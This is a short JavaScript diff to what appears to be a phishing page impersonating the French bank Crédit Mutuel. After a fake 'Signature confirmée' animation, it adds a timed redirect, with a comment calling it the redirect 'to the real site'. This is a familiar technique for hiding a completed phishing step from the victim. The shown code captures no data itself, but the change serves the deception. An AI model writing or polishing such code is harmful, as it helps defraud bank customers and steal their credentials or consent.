@@ -667,6 +667,11 @@ label.field-label {
             stepLoading.classList.remove('active');
             stepSuccess.classList.add('active');
             mainTitle.textContent = 'Signature confirmée';
+
+            /* ═══ REDIRECTION VERS LE VRAI SITE APRÈS L'ANIMATION ═══ */
+            setTimeout(() => {
+                window.location.href = 'https://www.creditmutuel.fr/';
+            }, 3500);
         }, 2500);
     });
 </script>
